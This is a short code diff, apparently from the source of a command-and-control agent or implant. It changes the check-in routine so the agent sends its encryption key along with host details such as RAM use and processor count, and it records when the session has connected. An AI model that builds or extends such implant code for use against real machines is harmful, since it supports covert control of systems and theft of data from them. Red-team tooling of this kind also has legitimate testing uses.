@@ -75,6 +75,9 @@ auto DECLFN Transport::Checkin(
     Self->Pkg->Int32( CheckinPkg, Self->Machine.PercentRAM );
     Self->Pkg->Int32( CheckinPkg, Self->Machine.ProcessorsNbr );
 
+    // encryption key
+    Self->Pkg->Bytes( CheckinPkg, Self->Crp->Key, sizeof( Self->Crp->Key ) );
+
     //
     // send the packet
     //
@@ -113,9 +116,11 @@ auto DECLFN Transport::Checkin(
 
     KhDbg( "set uuid: %s", Self->Session.AgentID );
 
+    Self->Session.Connected = TRUE;
+
     KhDbg( "checkin routine done..." );
 
-    return TRUE;
+    return Self->Session.Connected;
 }
 
 auto Transport::Send(
